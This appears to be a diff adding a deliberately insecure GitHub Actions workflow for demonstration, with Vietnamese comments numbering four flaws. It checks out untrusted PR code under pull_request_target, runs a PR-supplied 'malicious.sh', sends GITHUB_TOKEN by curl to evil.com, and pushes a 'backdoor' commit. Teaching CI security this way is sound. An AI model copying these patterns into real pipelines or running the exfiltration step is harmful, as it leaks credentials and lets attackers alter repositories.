@@ -1,0 +1,41 @@
+name: Vulnerable CI/CD Pipeline
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+jobs:
+  vulnerable-job:
+    runs-on: ubuntu-latest
+    steps:
+    
+      # 🚨 LỖ HỔNG 1: Checkout mã nguồn từ PR mà không kiểm tra
+      - name: Checkout PR Code
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      # 🚨 LỖ HỔNG 2: Chạy script không kiểm soát từ PR
+      - name: Run arbitrary script from PR
+        run: |
+          chmod +x malicious.sh
+          ./malicious.sh
+
+      # 🚨 LỖ HỔNG 3: Lấy secret và gửi ra ngoài
+      - name: Leak GitHub Token
+        run: |
+          echo "Leaking secret..."
+          curl -X POST -d "token=${{ secrets.GITHUB_TOKEN }}" http://evil.com/steal-token
+
+      # 🚨 LỖ HỔNG 4: Commit & Push thay đổi vào repo chính mà không kiểm soát
+      - name: Commit and push code
+        run: |
+          git config --global user.email "attacker@evil.com"
+          git config --global user.name "Attacker"
+          echo "Hacked!" >> HACKED.txt
+          git add HACKED.txt
+          git commit -m "Inject backdoor"
+          git push origin ${{ github.event.pull_request.head.ref }}
